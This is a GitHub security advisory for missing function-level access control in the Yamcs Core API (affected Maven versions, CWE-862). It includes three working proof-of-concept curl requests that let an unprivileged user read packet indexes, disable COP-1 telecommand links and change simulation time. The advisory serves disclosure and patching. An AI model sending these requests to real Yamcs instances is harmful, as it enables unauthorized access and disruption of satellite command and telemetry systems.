# [H] Yamcs Core API has Multiple Missing Function Level Access Control vulnerabilities

## Summary
Severity: High
Advisory: GHSA-962x-ccwf-8x6p
CVE: CVE-2026-55521
CWE: CWE-862
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-962x-ccwf-8x6p
Type: github-advisory

## Affected
- Maven: `org.yamcs:yamcs-core` — affected >=5.13.0 <5.13.2
- Maven: `org.yamcs:yamcs-core` — affected >=0 <5.12.8

## Details
### Summary
Multiple Missing Function Level Access Control vulnerabilities exist in the Yamcs Core API. These vulnerabilities allow any authenticated user, regardless of their assigned roles or privileges (e.g., an unprivileged "Guest"), to bypass intended access controls. An attacker can exploit these flaws to extract sensitive telemetry metadata, disrupt satellite communication link protocols (COP-1), and manipulate the global simulation time, severely impacting the confidentiality, integrity, and availability of the system.

### Details
Yamcs utilizes a robust Role-Based Access Control (RBAC) model with `SystemPrivilege` and `ObjectPrivilege` to restrict administrative actions and data retrieval. However, three critical API controllers completely omit these authorization checks before executing internal business logic:

1.  **`IndexesApi.java` (Information Disclosure):** Unlike `PacketsApi.java`, which filters results using `ctx.user.hasObjectPrivilege(ObjectPrivilegeType.ReadPacket, packetName)`, methods in `IndexesApi` (such as `listPacketIndex` and `listEventIndex`) directly retrieve and return archive records from the `CcsdsTmIndex` without verifying if the user has the required Object Privileges.
2.  **`Cop1Api.java` (Denial of Service / Integrity):** Modifying the COP-1 telecommand protocol state is an administrative action requiring `SystemPrivilege.ControlLinks`. However, endpoints in `Cop1Api` (e.g., `disable`, `resume`, `initialize`, `updateConfig`) process link state alterations without calling `ctx.checkSystemPrivilege(...)`.
3.  **`TimeApi.java` (Denial of Service / Integrity):** The `setTime` method allows modification of the global `SimulationTimeService` (affecting all processors, telemetry, and tests in that instance). This endpoint fails to assert any system privileges before applying the requested simulation speed or time jumps.

### PoC
**Prerequisite:** Obtain valid credentials for a completely unprivileged user (e.g., `user_without_priv:password` with no roles assigned).

**PoC 1: Extracting Packet Indexes (`IndexesApi`)**
```bash
curl -s -X GET "http://localhost:8090/api/archive/simulator/packet-index" \
     -u "user_without_priv:password"
```
*Result:* Returns HTTP 200 OK with a full JSON array of packet indexes, bypassing Object Privilege checks and leaking system metadata.

**PoC 2: Disabling COP-1 Protocol (`Cop1Api`)**
```bash
curl -s -X POST "http://localhost:8090/api/cop1/simulator/tc_sim:disable" \
     -u "user_without_priv:password" \
     -H "Content-Type: application/json" -d '{}'
```
*Result:* The server processes the request past the authorization layer. Depending on the link configuration, it will either successfully disable COP-1 or return `400 BadRequestException` confirming the link does not support COP-1. The absence of a `403 Forbidden` confirms the authorization bypass.

**PoC 3: Manipulating Simulation Time (`TimeApi`)**
```bash
curl -s -X POST "http://localhost:8090/api/instances/simulator:setTime" \
     -u "user_without_priv:password" \
     -H "Content-Type: application/json" -d '{"speed": 10.0}'
```
*Result:* The server processes the request past the authorization layer. It changes the global simulation speed if the service is active, or returns `400 BadRequestException: Cannot set time for a non-simulation TimeService`. The absence of a `403 Forbidden` confirms the authorization bypass.

### Impact
The vulnerability impacts instances of Yamcs exposing the REST API. 
*   **Confidentiality:** Unprivileged users can enumerate all historical telemetry packet and event metadata.
*   **Integrity & Availability:** Attackers can disable critical satellite telecommand protocols (COP-1) causing command transmission failures. They can also manipulate the global simulation time, disrupting processors, automated tests, and all other users relying on the simulation environment.

### PoC Images:
- Check user permission
<img width="1218" height="951" alt="image" src="https://github.com/user-attachments/assets/fa7b1f1b-70fc-4796-805a-70acb84686d3" />

- Check admin permission and access API:
<img width="1768" height="555" alt="image" src="https://github.com/user-attachments/assets/844364f7-5e26-4c15-8809-6512f10ffbab" />

- Check user no permission - get response same with user admin:
<img width="1264" height="885" alt="image" src="https://github.com/user-attachments/assets/8773cef6-f940-48f7-a382-0eb87b8767d4" />
<img width="1243" height="358" alt="image" src="https://github.com/user-attachments/assets/3288f092-7114-48d6-9e5c-9aeaf20d95d4" />

## References
- https://github.com/yamcs/yamcs/security/advisories/GHSA-962x-ccwf-8x6p
- https://github.com/yamcs/yamcs
